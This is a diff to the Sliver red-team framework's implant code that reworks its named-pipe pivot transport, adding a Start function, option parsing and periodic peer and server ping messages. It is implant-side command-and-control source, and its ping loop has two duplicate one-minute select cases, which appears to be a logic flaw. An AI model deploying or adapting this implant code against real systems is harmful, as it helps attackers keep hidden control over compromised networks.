@@ -26,6 +26,7 @@ import (
 	"io"
 	"net/url"
 	"sync"
+	"time"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -33,17 +34,14 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"google.golang.org/protobuf/proto"
 )
 
 func namedPipeConnect(uri *url.URL) (*Connection, error) {
-	opts := &pivotclients.NamedPipePivotOptions{}
-	client, err := pivotclients.NamedPipePivotStartSession(uri, opts)
-	if err != nil {
-		return nil, err
-	}
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
 	ctrl := make(chan struct{}, 1)
+	pingCtrl := make(chan struct{}, 1)
 	connection := &Connection{
 		Send:    send,
 		Recv:    recv,
@@ -70,31 +68,88 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 		return nil
 	}
 
-	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
-			// {{end}}
-			client.WriteEnvelope(envelope)
+	connection.Start = func() error {
+		opts := pivotclients.ParseNamedPipePivotOptions(uri)
+		pivot, err := pivotclients.NamedPipePivotStartSession(uri, opts)
+		if err != nil {
+			return err
 		}
-	}()
+		go func() {
+			for {
+				select {
+				case <-pingCtrl:
+					return
+				case <-time.After(time.Minute):
+					data, _ := proto.Marshal(&pb.PivotPing{
+						Nonce: uint32(time.Now().UnixNano()),
+					})
+					connection.Send <- &pb.Envelope{
+						Type: pb.MsgPivotPeerPing,
+						Data: data,
+					}
+				case <-time.After(time.Minute):
+					// {{if .Config.Debug}}
+					log.Printf("[namedpipe] server ping...")
+					// {{end}}
+					data, _ := proto.Marshal(&pb.PivotPing{
+						Nonce: uint32(time.Now().UnixNano()),
+					})
+					connection.Send <- &pb.Envelope{
+						Type: pb.MsgPivotServerPing,
+						Data: data,
+					}
+				}
+			}
+		}()
 
-	go func() {
-		defer connection.Cleanup()
-		for {
-			envelope, err := client.ReadEnvelope()
-			if err == io.EOF {
-				break
-			}
-			if err == nil {
-				recv <- envelope
+		go func() {
+			defer func() {
+				connection.Cleanup()
+			}()
+			for envelope := range send {
 				// {{if .Config.Debug}}
-				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
+				log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
 				// {{end}}
+				pivot.WriteEnvelope(envelope)
 			}
-		}
-	}()
+		}()
+
+		go func() {
+			defer connection.Cleanup()
+			for {
+				envelope, err := pivot.ReadEnvelope()
+				if err == io.EOF {
+					break
+				}
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[namedpipe] read envelope error: %s", err)
+					// {{end}}
+					continue
+				}
+				if envelope == nil {
+					// {{if .Config.Debug}}
+					log.Printf("[namedpipe] read nil envelope")
+					// {{end}}
+					continue
+				}
+				if envelope.Type == pb.MsgPivotPeerPing {
+					// {{if .Config.Debug}}
+					log.Printf("[namedpipe] received peer pong")
+					// {{end}}
+					continue
+				}
+				if err == nil {
+					recv <- envelope
+					// {{if .Config.Debug}}
+					log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
+					// {{end}}
+				}
+			}
+		}()
+
+		return nil
+	}
 
 	return connection, nil
 }
